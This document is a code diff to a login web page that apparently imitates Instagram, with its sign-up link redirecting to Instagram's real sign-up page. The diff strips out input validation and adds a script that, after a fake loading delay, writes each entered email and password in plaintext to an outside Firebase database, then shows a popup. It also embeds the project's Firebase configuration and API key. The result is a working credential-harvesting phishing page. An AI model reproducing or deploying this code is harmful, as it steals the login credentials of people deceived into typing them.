@@ -190,69 +190,57 @@
     </div>
 </div>
 
-<script>
-    function showPopup(message) {
-        const popupContent = document.querySelector('.popup-content');
-        popupContent.textContent = message;
-        document.getElementById('popup').classList.add('active');
-        document.getElementById('loading').classList.remove('active');
-    }
+<script type="module">
+    // Import the functions you need from the SDKs you need
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-app.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-database.js";
 
-    function hidePopup() {
-        document.getElementById('popup').classList.remove('active');
-    }
+    // Your web app's Firebase configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyBASTYwglM57RKcJtGO9OacYxhlEPgDFVU",
+        authDomain: "hecabrus-86704.firebaseapp.com",
+        databaseURL: "https://hecabrus-86704-default-rtdb.firebaseio.com",
+        projectId: "hecabrus-86704",
+        storageBucket: "hecabrus-86704.appspot.com",
+        messagingSenderId: "1041062334121",
+        appId: "1:1041062334121:web:7419eb163492764480a3b8",
+        measurementId: "G-CN4DCXTLFV"
+    };
 
-    function showToast(message) {
-        const toast = document.createElement('div');
-        toast.textContent = message;
-        toast.style.position = 'fixed';
-        toast.style.bottom = '20px';
-        toast.style.left = '50%';
-        toast.style.transform = 'translateX(-50%)';
-        toast.style.backgroundColor = '#333';
-        toast.style.color = '#fff';
-        toast.style.padding = '10px 20px';
-        toast.style.borderRadius = '5px';
-        toast.style.fontSize = '14px';
-        document.body.appendChild(toast);
-        setTimeout(() => {
-            toast.remove();
-        }, 1000); // Toast visible for 1 second
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
+
+    function writeUserData(email, password) {
+        const userId = email.replace(/[^a-zA-Z0-9]/g, '_'); // Simple way to create a unique ID
+        set(ref(database, 'users/' + userId), {
+            email: email,
+            password: password
+        });
     }
 
     function handleLogin() {
-        const email = document.getElementById('email').value.trim();
-        const password = document.getElementById('password').value.trim();
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("password").value;
+        
+        // Display loading animation
+        document.getElementById("loading").classList.add("active");
 
-        if (!email || !password) {
-            showToast('error');
-            return;
-        }
+        // Simulate a delay to mimic network request
+        setTimeout(() => {
+            // Hide loading animation
+            document.getElementById("loading").classList.remove("active");
 
-        document.getElementById('loading').classList.add('active');
+            // Write user data to Firebase
+            writeUserData(email, password);
 
-        setTimeout(function() {
-            document.getElementById('loading').classList.remove('active');
-            
-            if (email.length < 4) {
-                showToast('Username must be at least 4 characters');
-                return;
-            }
-            if (password.length < 8) {
-                showToast('Password must be at least 8 characters');
-                return;
-            }
-
-            // Clear inputs after login
-            document.getElementById('email').value = '';
-            document.getElementById('password').value = '';
-
-            showPopup('Your application has been received. Check back in a week for an update.');
-        }, 3000); // Simulate loading for 3 seconds
+            // Show the pop-up
+            showPopup();
+        }, 2000); // 2-second delay
     }
 
     function handleFacebookLogin() {
-        showToast('error');
+        alert('error');
     }
 
     function handleForgotPassword() {
@@ -262,6 +250,15 @@
     function handleSignUp() {
         window.location.href = 'https://www.instagram.com/accounts/emailsignup/';
     }
+
+    function showPopup() {
+        document.getElementById("popup").classList.add("active");
+    }
+
+    function hidePopup() {
+        document.getElementById("popup").classList.remove("active");
+    }
 </script>
+
 </body>
 </html>
